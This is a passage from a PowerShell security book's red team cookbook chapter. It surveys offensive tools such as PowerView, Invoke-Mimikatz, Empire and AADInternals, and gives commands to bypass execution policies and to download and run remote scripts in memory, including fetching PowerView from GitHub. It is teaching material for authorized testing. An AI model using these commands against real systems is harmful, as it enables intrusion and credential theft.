<html><head></head><body>
		<div id="_idContainer194">
			<h1 class="chapter-number" id="_idParaDest-194"><a id="_idTextAnchor204"/>8</h1>
			<h1 id="_idParaDest-195"><a id="_idTextAnchor205"/>Red Team Tasks and Cookbook</h1>
			<p>This chapter is meant to be a quick and dirty reference for red teamers that want to use PowerShell for their engagements. It is by no means complete but should help you <span class="No-Break">get started.</span></p>
			<p>After a short introduction to the phases of attack, we are going to look at what tools are usually used by red teamers for PowerShell-based engagements. After that, we will provide a PowerShell cookbook that covers most typical red team scenarios when it comes <span class="No-Break">to PowerShell.</span></p>
			<p>In this chapter, we will discuss the <span class="No-Break">following topics:</span></p>
			<ul>
				<li>Phases of <span class="No-Break">an attack</span></li>
				<li>Common PowerShell red <span class="No-Break">team tools</span></li>
				<li>Red <span class="No-Break">team cookbook</span></li>
			</ul>
			<h1 id="_idParaDest-196"><a id="_idTextAnchor206"/>Technical requirements</h1>
			<p>To get the most out of this chapter, ensure that you have <span class="No-Break">the following:</span></p>
			<ul>
				<li>Windows <span class="No-Break">PowerShell 5.1</span></li>
				<li>PowerShell 7.3 <span class="No-Break">and above</span></li>
				<li>Visual Studio <span class="No-Break">Code installed</span></li>
				<li>Access to the GitHub repository for this <span class="No-Break">chapter: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/tree/master/Chapter08"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/tree/master/Chapter08</span></a></li>
			</ul>
			<h1 id="_idParaDest-197"><a id="_idTextAnchor207"/>Phases of an attack</h1>
			<p>When it comes to an attack, the same<a id="_idIndexMarker1436"/> pattern is usually repeated over and over again. These phases are also reflected when it comes to a professional penetration test, which is performed by <span class="No-Break">red teamers.</span></p>
			<p>The following diagram illustrates the phases of <span class="No-Break">an attack:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer192">
					<img alt="Figure 8.1 – Phases of an attack" src="image/B16679_08_001.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.1 – Phases of an attack</p>
			<p>In the first phase, known as <strong class="bold">reconnaissance</strong>, the red teamer tries to get as much information as possible<a id="_idIndexMarker1437"/> about the target. Once this phase has been<a id="_idIndexMarker1438"/> completed, vulnerabilities are identified (<strong class="bold">vulnerability identification</strong>) that can be used for <strong class="bold">exploitation</strong> and getting access to <span class="No-Break">the</span><span class="No-Break"><a id="_idIndexMarker1439"/></span><span class="No-Break"> target.</span></p>
			<p>Once a target has been<a id="_idIndexMarker1440"/> successfully exploited, usually, credentials are collected, which can be used for <strong class="bold">lateral movement</strong> and to collect even more identities. Part of <strong class="bold">post-exploitation</strong> is to gain <strong class="bold">persistence</strong>, which means that the red teamer can reconnect<a id="_idIndexMarker1441"/> without the need to exploit vulnerabilities<a id="_idIndexMarker1442"/> <span class="No-Break">once more.</span></p>
			<p>Lateral movement can also occur by finding more vulnerabilities that can be exploited, for example by finding and exploiting a vulnerability in other connected systems that wasn’t accessible through the primary point of entry and cannot simply be reached by just gathering and <span class="No-Break">abusing identities.</span></p>
			<p>While moving laterally, the goal is usually to find a very valuable identity that has high privileges, such as a domain administrator account, which can then be used to gain control of the entire environment to achieve the actual <strong class="bold">goal</strong> of the engagement: in real-world adversary scenarios, this could be either to encrypt all possible systems to demand a ransom (as is done by <strong class="bold">ransomware</strong>) or to stay in the environment undetected as long as possible to <span class="No-Break"><strong class="bold">extract information</strong></span><span class="No-Break">.</span></p>
			<p>Last but not least, adversaries try to <strong class="bold">cover their tracks</strong> in a real-world scenario. This step is – of course – not necessary if we are talking about a penetration test engagement; in this case, the pentester usually writes a <strong class="bold">report</strong> as a last step to present <span class="No-Break">their findings.</span></p>
			<p>All these steps might sound quite time-consuming, but in reality, most of the steps are already scripted, and it is only a matter of a few hours or even minutes until the entire environment is compromised. So long as the attack hasn’t started, the adversary has as much time as they like to do their reconnaissance to find out as much as possible about the target <span class="No-Break">and prepare.</span></p>
			<p>Once the first host has been compromised, it usually does not take longer than 24 to 48 hours until a domain administrator account is compromised. But usually, depending on the organization and the industry, it takes some time until it is discovered that an actual attack has happened… if it is detected <span class="No-Break">at all…</span></p>
			<p>If adversaries are launching a ransomware campaign, they will not remain unnoticed once they start encrypting systems and demanding ransom. But usually, they still go unnoticed for a significant time to prepare for <span class="No-Break">their attack.</span></p>
			<p>For red teamers, PowerShell is a great tool as it is built into every modern Windows operating system and offers a mechanism for remote command execution. It also offers full access to system APIs via WMI and .NET Framework and can be used for fileless code execution, meaning<a id="_idIndexMarker1443"/> that malicious code can be executed in memory without the need<a id="_idIndexMarker1444"/> to write it to disk if intended. Additionally, it can be used to evade <strong class="bold">antivirus</strong> (<strong class="bold">AV</strong>), as well as <strong class="bold">intrusion prevention </strong><span class="No-Break"><strong class="bold">systems</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">IPSs</strong></span><span class="No-Break">).</span></p>
			<p>Although there are many commands<a id="_idIndexMarker1445"/> that red teamers can leverage for their purposes, there is also a plethora of open source tools that provide several capabilities that are very helpful in red team engagements, as well as in real-world <span class="No-Break">scenario attacks.</span></p>
			<h1 id="_idParaDest-198"><a id="_idTextAnchor208"/>Common PowerShell red team tools</h1>
			<p>Many tools have been released that are written in PowerShell<a id="_idIndexMarker1446"/> that can help you with your red team engagements – too many for you to make use of every single one. In this section, we will look at some of the most well-known and helpful tools to get you started and provide you with an overview of what is out there <span class="No-Break">to help.</span></p>
			<h2 id="_idParaDest-199"><a id="_idTextAnchor209"/>PowerSploit</h2>
			<p><strong class="bold">PowerSploit</strong> is a collection of PowerShell modules and scripts<a id="_idIndexMarker1447"/> that can help red teamers<a id="_idIndexMarker1448"/> during a penetration testing engagement. It was originally developed by Matt Graeber. It is no longer supported, but there are still many useful tools and scripts that are helpful. PowerSploit can be downloaded from <span class="No-Break">GitHub: </span><span class="No-Break">https://github.com/PowerShellMafia/PowerSploit</span><span class="No-Break">.</span></p>
			<p>While most functions work fine in Windows PowerShell, they don’t in PowerShell 7 and above. Some functionalities that PowerSploit made use of from .NET Framework were not ported into .NET Core, on which PowerShell 7 relies. So, when running PowerSploit from PowerShell 7 and above, you will likely experience errors. Therefore, we will be using Windows PowerShell for demonstration purposes in <span class="No-Break">this chapter.</span></p>
			<p>PowerSploit is a very extensive collection, so we will not deep-dive into it. It comes with several subfolders, which group its PowerShell modules into the <span class="No-Break">following categories:</span></p>
			<ul>
				<li><span class="No-Break"><strong class="source-inline">CodeExecution</strong></span></li>
				<li><span class="No-Break"><strong class="source-inline">ScriptModification</strong></span></li>
				<li><span class="No-Break"><strong class="source-inline">Persistence</strong></span></li>
				<li><span class="No-Break"><strong class="source-inline">AntivirusBypass</strong></span></li>
				<li><span class="No-Break"><strong class="source-inline">Exfiltration</strong></span></li>
				<li><span class="No-Break"><strong class="source-inline">Mayhem</strong></span></li>
				<li><strong class="source-inline">Privesc</strong> (<span class="No-Break">privilege escalation)</span></li>
				<li><span class="No-Break"><strong class="source-inline">Recon</strong></span><span class="No-Break"> (reconnaissance)</span></li>
			</ul>
			<p>You can either load the entire collection as a module or just load parts of it; it is possible to just copy and paste one of the subfolders into your module folder and <span class="No-Break">load it.</span></p>
			<p>As usual, you can find all the related functions and aliases of PowerSploit by running the <span class="No-Break">following command:</span></p>
			<pre class="source-code">
Get-Command -Module PowerSploit</pre>
			<p>To make the most<a id="_idIndexMarker1449"/> out of it, you can refer to the official <span class="No-Break">documentation: </span><a href="https://powersploit.readthedocs.io/en/latest/"><span class="No-Break">https://powersploit.readthedocs.io/en/latest/</span></a><span class="No-Break">.</span></p>
			<p>One tool within PowerSploit that<a id="_idIndexMarker1450"/> might be worth<a id="_idIndexMarker1451"/> taking a second look at <span class="No-Break">is PowerView.</span></p>
			<h3>PowerView</h3>
			<p>You can find the <strong class="bold">PowerView</strong> script within the <strong class="source-inline">Recon</strong> folder on<a id="_idIndexMarker1452"/> <span class="No-Break">GitHub: </span><span class="No-Break">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</span><span class="No-Break">.</span></p>
			<p>You can either import and load the entire <strong class="source-inline">Recon</strong> folder or you can just download and run the <strong class="source-inline">PowerView.ps1</strong> script, which might be easier in engagements when you need to execute your payloads from memory and not <span class="No-Break">from disk.</span></p>
			<p>PowerView has many built-in features, some of which<a id="_idIndexMarker1453"/> are <span class="No-Break">as follows:</span></p>
			<ul>
				<li>Enumeration and gathering information about domains, <strong class="bold">domain controllers</strong> (<strong class="bold">DCs</strong>), users, groups, computers, global <a id="_idIndexMarker1454"/>catalogs, directory service sites, <span class="No-Break">and trusts</span></li>
				<li>Enumeration of permission and access control of <span class="No-Break">domain resources</span></li>
				<li>Identifying where in the domain specific users are logged on and which machines the current user has <span class="No-Break">access to</span></li>
			</ul>
			<p>You can find a full overview<a id="_idIndexMarker1455"/> of PowerView in the official <span class="No-Break">documentation: </span><a href="https://powersploit.readthedocs.io/en/latest/Recon/"><span class="No-Break">https://powersploit.readthedocs.io/en/latest/Recon/</span></a><span class="No-Break">.</span></p>
			<h2 id="_idParaDest-200"><a id="_idTextAnchor210"/>Invoke-Mimikatz</h2>
			<p><strong class="bold">Mimikatz</strong> is a well-known tool in the<a id="_idIndexMarker1456"/> cybersecurity<a id="_idIndexMarker1457"/> world. It helps<a id="_idIndexMarker1458"/> you extract<a id="_idIndexMarker1459"/> and reuse credentials, such <a id="_idIndexMarker1460"/>as hashes or tickets from the <strong class="bold">local security authority</strong> (<strong class="bold">LSA</strong>), which enables red teamers to conduct a <strong class="bold">Pass-the-Hash</strong> (<strong class="bold">PtH</strong>) or <strong class="bold">Pass-the-Ticket</strong> (<span class="No-Break"><strong class="bold">PtT</strong></span><span class="No-Break">) attack.</span></p>
			<p>Mimikatz itself was written in C by Benjamin Delpy. However, Joseph Bialek managed to wrap it into a PowerShell script, which was included in PowerSploit, Nishang, and many other toolkits. I believe that the script that was hosted in Nishang was the latest version that I could find when writing this <span class="No-Break">book: </span><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1"><span class="No-Break">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1</span></a><span class="No-Break">.</span></p>
			<p>After loading the <strong class="source-inline">Invoke-Mimikatz.ps1</strong> script into the current session, you can just call Mimikatz’s function by executing <strong class="source-inline">Invoke-Mimikatz</strong> on the PowerShell <span class="No-Break">command line.</span></p>
			<p>For the official Mimikatz documentation, please refer to the C Mimikatz version’s GitHub <span class="No-Break">repository: </span><span class="No-Break">https://github.com/gentilkiwi/mimikatz.</span></p>
			<p>At the time of writing, Mimikatz is very well known by defenders and anti-malware solutions, so you should not just assume that <strong class="source-inline">Invoke-Mimikatz</strong> will just work without being detected<a id="_idIndexMarker1461"/> or alerted. To make it work successfully, you will want to obfuscate it – and even then it will often <span class="No-Break">be detected.</span></p>
			<h2 id="_idParaDest-201"><a id="_idTextAnchor211"/>Empire</h2>
			<p><strong class="bold">PowerShell Empire</strong> is a post-exploitation framework and was<a id="_idIndexMarker1462"/> developed by Will Schroeder, Justin<a id="_idIndexMarker1463"/> Warner, Matt Nelson, Steve Borosh, Alexander Rymdeko-Harvey, and Chris Ross. It is not supported any longer but still contains a lot of good <span class="No-Break">stuff, nevertheless.</span></p>
			<p>It was built to provide red teamers a platform to perform post-exploitation tasks, similar to Metasploit, and contains features such as <span class="No-Break">the following:</span></p>
			<ul>
				<li>The ability to generate payloads to <span class="No-Break">compromise systems</span></li>
				<li>The possibility to import and use third-party tools such <span class="No-Break">as Mimikatz</span></li>
				<li>A <strong class="bold">Command and Control</strong> (<strong class="bold">C2</strong>) server, which can be used for communication with <span class="No-Break">compromised hosts.</span></li>
				<li>A library of post-exploitation modules that can be used for many tasks, such as information gathering, privilege<a id="_idIndexMarker1464"/> escalation, and <span class="No-Break">establishing persistence</span></li>
			</ul>
			<p>Empire<a id="_idIndexMarker1465"/> can be downloaded from <span class="No-Break">GitHub: </span><span class="No-Break">https://github.com/EmpireProject/Empire</span><span class="No-Break">.</span></p>
			<p>To quickly get started, there is even a QuickStart <span class="No-Break">guide: </span><span class="No-Break">https://github.com/EmpireProject/Empire/wiki/Quickstart</span><span class="No-Break">.</span></p>
			<h2 id="_idParaDest-202"><a id="_idTextAnchor212"/>Inveigh</h2>
			<p><strong class="bold">Inveigh</strong> is a .NET IPv4/IPv6 machine-in-the-middle tool<a id="_idIndexMarker1466"/> that was developed by Kevin<a id="_idIndexMarker1467"/> Robertson. It was originally developed in PowerShell but later ported to C#, which made it available cross-platform. The latest PowerShell version of Inveigh is 1.506 and is no longer developed at the time of writing, but it is still available on GitHub. The latest C# version <span class="No-Break">is 2.0.9.</span></p>
			<p>Here are the main features<a id="_idIndexMarker1468"/> of the <span class="No-Break">PowerShell version:</span></p>
			<ul>
				<li>Domain Name System (DNS)/Active Directory Integrated DNS (ADIDNS)/Link-Local Multicast Name Resolution (LLMNR)/Multicast DNS (mDNS)/NetBIOS Name Service (<span class="No-Break">NBNS) spoofing</span></li>
				<li>Inveigh can listen for and respond to LLMNR/mDNS/NBNS requests via .NET <span class="No-Break">packet sniffing</span></li>
				<li>Inveigh can capture NTLMv1/NTLMv2 authentication attempts <span class="No-Break">over SMB</span></li>
				<li>Inveigh provides HTTP/HTTPS/proxy listeners to capture incoming <span class="No-Break">authentication requests</span></li>
			</ul>
			<p>It can be downloaded from <span class="No-Break">GitHub: </span><span class="No-Break">https://github.com/Kevin-Robertson/Inveigh</span><span class="No-Break">.</span></p>
			<h2 id="_idParaDest-203"><a id="_idTextAnchor213"/>PowerUpSQL</h2>
			<p><strong class="bold">PowerUpSQL</strong> was developed by Scott Sutherland<a id="_idIndexMarker1469"/> and is a PowerShell module<a id="_idIndexMarker1470"/> for attacking SQL servers. Although it offers a variety of possibilities, it does not support SQL <span class="No-Break">injection yet.</span></p>
			<p>Here’s an overview of <span class="No-Break">PowerUpSQL’s capabilities:</span></p>
			<ul>
				<li>Enumerate SQL Server instances and databases, as well as users, roles, <span class="No-Break">and permissions</span></li>
				<li>Weak <span class="No-Break">configuration auditing</span></li>
				<li>Privilege escalation<a id="_idIndexMarker1471"/> and obtaining <span class="No-Break">system-level access</span></li>
			</ul>
			<p>You can find this project and its documentation on <span class="No-Break">GitHub: </span><span class="No-Break">https://github.com/NetSPI/PowerUpSQL</span><span class="No-Break">.</span></p>
			<h2 id="_idParaDest-204"><a id="_idTextAnchor214"/>AADInternals</h2>
			<p><strong class="bold">AADInternals</strong>, developed by Nestori Syynimaa, is an extensive<a id="_idIndexMarker1472"/> PowerShell module that offers<a id="_idIndexMarker1473"/> a huge range of capabilities for administrating, enumerating, and exploiting Azure AD and Office <span class="No-Break">365 environments.</span></p>
			<p>Some of its features<a id="_idIndexMarker1474"/> are <span class="No-Break">as follows:</span></p>
			<ul>
				<li>Enumerate Azure AD and Office 365 environments; review and modify permissions and <span class="No-Break">access rights.</span></li>
				<li>Create <span class="No-Break">backdoor users.</span></li>
				<li>Exfiltrate credentials, such <span class="No-Break">as PRTs.</span></li>
				<li>Extract or change the Azure AD connector <span class="No-Break">account password.</span></li>
				<li>Tamper with <span class="No-Break">authentication options.</span></li>
				<li>Extract <span class="No-Break">encryption keys.</span></li>
				<li>Create users in <span class="No-Break">Azure AD.</span></li>
				<li>And <span class="No-Break">many </span><span class="No-Break"><a id="_idIndexMarker1475"/></span><span class="No-Break">more.</span></li>
			</ul>
			<p>You can simply install it from the PowerShell command line using <strong class="source-inline">Install-Module AADInternals</strong>. You can download<a id="_idIndexMarker1476"/> it from PowerShell <span class="No-Break">Gallery: </span><span class="No-Break">https://www.powershellgallery.com/packages/AADInternals/</span><span class="No-Break">.</span></p>
			<p>You can also find this project on <span class="No-Break">GitHub: </span><span class="No-Break">https://github.com/Gerenios/AADInternals</span><span class="No-Break">.</span></p>
			<h1 id="_idParaDest-205"><a id="_idTextAnchor215"/>Red team cookbook</h1>
			<p>In this section, you will find some handy<a id="_idIndexMarker1477"/> code snippets for your red team engagement. Please also refer to <a href="B16679_09_Final_PD.xhtml#_idTextAnchor228"><span class="No-Break"><em class="italic">Chapter 9</em></span></a>, <em class="italic">Blue Team Tasks and Cookbook</em>, as you will find many blue teamer code snippets and scripts there. These can sometimes also be useful for a <span class="No-Break">red teamer.</span></p>
			<p>Please note that this cookbook is not a complete red team reference as this would fill an entire book. Rather, it intends to be a helpful source to help you get started with PowerShell-related <span class="No-Break">red teaming.</span></p>
			<p>To make it easier to understand for<a id="_idIndexMarker1478"/> people starting in cybersecurity, this cookbook has been categorized into <strong class="bold">MITRE ATT&amp;CK</strong> areas. Please note that you will not find <em class="italic">all</em> the MITRE ATT&amp;CK areas in <span class="No-Break">this cookbook.</span></p>
			<p>You can find the full MITRE ATT&amp;CK enterprise matrix<a id="_idIndexMarker1479"/> on the official MITRE web <span class="No-Break">page: </span><span class="No-Break">https://attack.mitre.org/matrices/enterprise/</span><span class="No-Break">.</span></p>
			<h2 id="_idParaDest-206"><a id="_idTextAnchor216"/>Reconnaissance</h2>
			<p>Usually, every attack starts<a id="_idIndexMarker1480"/> with reconnaissance, the initial phase<a id="_idIndexMarker1481"/> in which an adversary gathers information about a target system, network, or organization. Every little bit of information helps with planning the next phases of the attack and gaining insights and knowledge, identifying valuable targets, and executing a more targeted and successful attack <span class="No-Break">or assessment.</span></p>
			<h3>Finding out whether an AAD/Entra ID user exists and viewing their cloud-specific details</h3>
			<p>You want to find out whether an Azure/Entra ID user exists <a id="_idIndexMarker1482"/>and you wish to view<a id="_idIndexMarker1483"/> their cloud-specific details. You also want to find out whether Federated Active Directory<a id="_idIndexMarker1484"/> is in use or whether the company<a id="_idIndexMarker1485"/> <span class="No-Break">uses O365.</span></p>
			<h4>Solution</h4>
			<p>To do this, you can query one of Azure AD’s/Entra <span class="No-Break">IDs APIs:</span></p>
			<pre class="source-code">
&gt; $AadInfo = Invoke-WebRequest "https://login.microsoftonline.com/getuserrealm.srf?login=PSSec-User@PSSec-Demo.onmicrosoft.com&amp;xml=1"
&gt; ([xml]$ AadInfo.Content).RealmInfo</pre>
			<p>You can find more information<a id="_idIndexMarker1486"/> about this API and the XML values it returns in <a href="B16679_07_Final_PD.xhtml#_idTextAnchor179"><span class="No-Break"><em class="italic">Chapter 7</em></span></a>, <em class="italic">Hacking the Cloud – Exploiting Azure Active </em><span class="No-Break"><em class="italic">Directory/Entra ID</em></span><span class="No-Break">.</span></p>
			<h2 id="_idParaDest-207"><a id="_idTextAnchor217"/>Execution</h2>
			<p>In the execution phase <a id="_idIndexMarker1487"/>of an attack, the malicious activities<a id="_idIndexMarker1488"/> are carried out by the attacker. The execution phase can be combined with other phases, such as executing an obfuscated PowerShell command, which is used to gather more information on <span class="No-Break">another host.</span></p>
			<h3>Evading execution policies</h3>
			<p>You come across a system <a id="_idIndexMarker1489"/>on which execution policies are enforced; they keep you from running a script, so you want to <span class="No-Break">evade them.</span></p>
			<p>There are several ways to configure an execution policy: it can be configured locally or via management solutions such as Group Policy. Depending on how it is configured, the <span class="No-Break">solution differs.</span></p>
			<h4>Solution</h4>
			<p>As discussed in detail in <a href="B16679_01_Final_PD.xhtml#_idTextAnchor016"><span class="No-Break"><em class="italic">Chapter 1</em></span></a>, <em class="italic">Getting Started with PowerShell</em>, an execution policy is not a security control and does not keep adversaries from running malicious code. Rather, it is a feature to prevent users from unintentionally executing scripts. However, there are several ways to avoid an <span class="No-Break">execution policy.</span></p>
			<p>If the execution policy was <em class="italic">not</em> enforced using Group Policy, you can easily set it to <strong class="source-inline">Unrestricted</strong> if you are a <span class="No-Break">local administrator:</span></p>
			<pre class="source-code">
&gt; Set-ExecutionPolicy Unrestricted</pre>
			<p>If you are <em class="italic">not</em> a local administrator, and the execution policy was <em class="italic">not</em> enforced using GPO (only set locally), you can use the <span class="No-Break">following code:</span></p>
			<pre class="source-code">
&gt; powershell.exe -ExecutionPolicy Bypass -File script.ps1
&gt; Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser</pre>
			<p>Regardless of whether you are a local administrator or not, as well as regardless of how the execution policy was configured, these commands will always work and run <span class="No-Break">your code:</span></p>
			<pre class="source-code">
&gt; echo <strong class="bold">&lt;command&gt;</strong> | PowerShell.exe -noprofile –
&gt; Get-Content ./script.ps1 | PowerShell.exe -noprofile –
&gt; powershell.exe -command <strong class="bold">&lt;command&gt;</strong>
&gt; Invoke-Command -scriptblock {<strong class="bold">&lt;command&gt;</strong>}
&gt; Invoke-Expression -Command <strong class="bold">&lt;command&gt;</strong></pre>
			<p>There are many solutions to this problem and they are not all listed here. If you want to bypass an execution policy<a id="_idIndexMarker1490"/>, this should not be an issue and can be done easily in <span class="No-Break">several ways.</span></p>
			<h3>Opening a PowerShell command line to execute a command</h3>
			<p>You want to pass a command<a id="_idIndexMarker1491"/> directly to a new PowerShell<a id="_idIndexMarker1492"/> session without opening a new shell and typing <span class="No-Break">the command.</span></p>
			<h4>Solution</h4>
			<p>You can achieve this by using <strong class="source-inline">powershell.exe</strong> with the <strong class="source-inline">-c</strong>/<strong class="source-inline">-Command</strong> parameter, followed by <span class="No-Break">your command:</span></p>
			<pre class="source-code">
&gt; powershell.exe -c &lt;command&gt;
&gt; powershell.exe -Command &lt;command&gt;</pre>
			<p>The <strong class="source-inline">-c</strong> option will execute<a id="_idIndexMarker1493"/> the supplied command wrapped in double quotes as if it were typed at the <span class="No-Break">PowerShell</span><span class="No-Break"><a id="_idIndexMarker1494"/></span><span class="No-Break"> prompt.</span></p>
			<h3>Avoiding loading settings from the PowerShell user profile</h3>
			<p>The PowerShell user profile<a id="_idIndexMarker1495"/> contains non-desirable<a id="_idIndexMarker1496"/> settings that you will want <span class="No-Break">to avoid.</span></p>
			<h4>Solution</h4>
			<p>Use the <strong class="source-inline">-NoProfile</strong> or <strong class="source-inline">-nop</strong> parameter, which results in PowerShell not loading the PowerShell user profile. The <strong class="source-inline">-nop</strong> argument is short <span class="No-Break">for </span><span class="No-Break"><strong class="source-inline">-NoProfile</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
&gt; powershell.exe -nop -c &lt;command&gt;
&gt; powershell.exe -NoProfile -c &lt;command&gt;</pre>
			<h3>Downloading a file using PowerShell cmdlets</h3>
			<p>You want to download<a id="_idIndexMarker1497"/> a file to a specified folder<a id="_idIndexMarker1498"/> on <span class="No-Break">your system.</span></p>
			<h4>Solution</h4>
			<p>There are multiple ways to download a file using <span class="No-Break">PowerShell cmdlets:</span></p>
			<ul>
				<li><span class="No-Break"><strong class="source-inline">Invoke-WebRequest</strong></span></li>
			</ul>
			<p>For all of the following examples, download the following script, which can be found at <a href="https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter01/HelloWorld.ps1">https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1</a>, and save it to the <span class="No-Break">C:\Users\Administrator\Downloads\HelloWorld</span><span class="No-Break"><strong class="source-inline">.ps1</strong></span><span class="No-Break"> path.</span></p>
			<p>To download a file using <strong class="source-inline">Invoke-WebRequest</strong>, you can use the following <span class="No-Break">code snippet:</span></p>
			<pre class="source-code">
Invoke-WebRequest -Uri <strong class="bold">&lt;source&gt;</strong> -OutFile <strong class="bold">&lt;destination&gt;</strong></pre>
			<p>Make sure you replace <strong class="source-inline">&lt;source&gt;</strong> and <strong class="source-inline">&lt;destination&gt;</strong> appropriately with the source of the file and where it should be downloaded, respectively, as shown in the <span class="No-Break">following example:</span></p>
			<pre class="source-code">
<strong class="bold">&gt; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1' -OutFile 'C:\Users\Administrator\Downloads\HelloWorld.ps1'</strong></pre>
			<p>It is also possible <a id="_idIndexMarker1499"/>to use its<a id="_idIndexMarker1500"/> <span class="No-Break">alias, </span><span class="No-Break"><strong class="source-inline">iwr</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
<strong class="bold">&gt; iwr -Uri 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1' -OutFile 'C:\Users\Administrator\Downloads\HelloWorld.ps1'</strong></pre>
			<ul>
				<li><span class="No-Break"><strong class="source-inline">Invoke-RestMethod</strong></span></li>
			</ul>
			<p>You can also use <strong class="source-inline">Invoke-RestMethod</strong> to return the content of scripts from <span class="No-Break">the internet:</span></p>
			<pre class="source-code">
iex (Invoke-RestMethod '<strong class="bold">&lt;url&gt;</strong>' )</pre>
			<p><strong class="source-inline">Invoke-RestMethod</strong> intends to retrieve data from <strong class="bold">Representational State Transfer</strong> (<strong class="bold">REST</strong>) web services. Depending on the data type, PowerShell formats the answer<a id="_idIndexMarker1501"/> accordingly: if it’s a <strong class="bold">JSON</strong> or <strong class="bold">XML</strong> file, the content is returned as <strong class="source-inline">[PSCustomObject]</strong>, but it can also retrieve and return single items, as shown in the <span class="No-Break">following example:</span></p>
			<pre class="source-code">
<strong class="bold">&gt; Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1'</strong></pre>
			<p>In this case, the file will not be downloaded; instead, it will be displayed <span class="No-Break">as output.</span></p>
			<ul>
				<li><span class="No-Break"><strong class="source-inline">Start-BitsTransfer</strong></span></li>
			</ul>
			<p>To download a file using <strong class="source-inline">Start-BitsTransfer</strong>, you can use the following <span class="No-Break">code snippet:</span></p>
			<pre class="source-code">
Start-BitsTransfer -Source <strong class="bold">&lt;source&gt;</strong> -Destination <strong class="bold">&lt;destination&gt;</strong></pre>
			<p>Make sure you replace <strong class="source-inline">&lt;source&gt;</strong> and <strong class="source-inline">&lt;destination&gt;</strong> appropriately with the source of the file and where it should<a id="_idIndexMarker1502"/> be downloaded, respectively, as shown in the <span class="No-Break">following</span><span class="No-Break"><a id="_idIndexMarker1503"/></span><span class="No-Break"> example:</span></p>
			<pre class="source-code">
<strong class="bold">&gt; Start-BitsTransfer -Source 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1' -Destination 'C:\Users\Administrator\Downloads\HelloWorld.ps1'</strong></pre>
			<h3>Downloading a file and executing it in memory</h3>
			<p>You want to download<a id="_idIndexMarker1504"/> a file but rather than saving it to disk, you want to execute<a id="_idIndexMarker1505"/> it <span class="No-Break">in memory.</span></p>
			<p>Please be aware of the security<a id="_idIndexMarker1506"/> implications: if you are downloading<a id="_idIndexMarker1507"/> and executing a script that you don’t control, an adversary can replace the content, which can cause arbitrary code to <span class="No-Break">be run.</span></p>
			<p>It is also important to note that even though an in-memory approach may seem more stealthy, it does not guarantee complete stealthiness due to PowerShell’s security transparency and excellent <span class="No-Break">event logging.</span></p>
			<h4>Solution</h4>
			<p>You can achieve this using the following <span class="No-Break">code snippets:</span></p>
			<pre class="source-code">
&gt; Invoke-Expression (Invoke-WebRequest -Uri '<strong class="bold">&lt;url to script&gt;</strong>')
&gt; iex(Invoke-WebRequest -Uri '<strong class="bold">&lt;url to script&gt;</strong>')
&gt; iex(Invoke-WebRequest -Uri '<strong class="bold">&lt;url to script&gt;</strong>'); <strong class="bold">&lt;command from script&gt;</strong>}</pre>
			<p>Please note that in this example, we are using <strong class="source-inline">Invoke-WebRequest</strong> to download the script, but you can use any other option that lets you download a script as well. Using <strong class="source-inline">Invoke-Expression</strong> or its alias, <strong class="source-inline">iex</strong>, you can directly execute <span class="No-Break">the script.</span></p>
			<p>It is even possible to execute a command from the script that was exported when running <span class="No-Break">the script.</span></p>
			<p>For this example, we will use the <strong class="source-inline">HelloWorld.ps1</strong> script from <span class="No-Break"><strong class="source-inline">Chapter01</strong></span><span class="No-Break">: </span><a href="https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1"><span class="No-Break">https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1</span></a><span class="No-Break">.</span></p>
			<p>The following example shows how you can simply download and execute <span class="No-Break">a file:</span></p>
			<pre class="source-code">
&gt; iex(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1')</pre>
			<p>Using this<a id="_idIndexMarker1508"/> example, you can download<a id="_idIndexMarker1509"/> and execute <strong class="source-inline">PowerView</strong> to run the <strong class="source-inline">Get-NetDomain</strong> command<a id="_idIndexMarker1510"/> directly, which<a id="_idIndexMarker1511"/> comes <span class="No-Break">with </span><span class="No-Break"><strong class="source-inline">PowerView</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
&gt; iex(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Get-NetDomain</pre>
			<h3>Downloading and executing a file using COM</h3>
			<p>You want to download<a id="_idIndexMarker1512"/> and execute a file from<a id="_idIndexMarker1513"/> the internet<a id="_idIndexMarker1514"/> using a <span class="No-Break">COM</span><span class="No-Break"><a id="_idIndexMarker1515"/></span><span class="No-Break"> object.</span></p>
			<h4>Solution</h4>
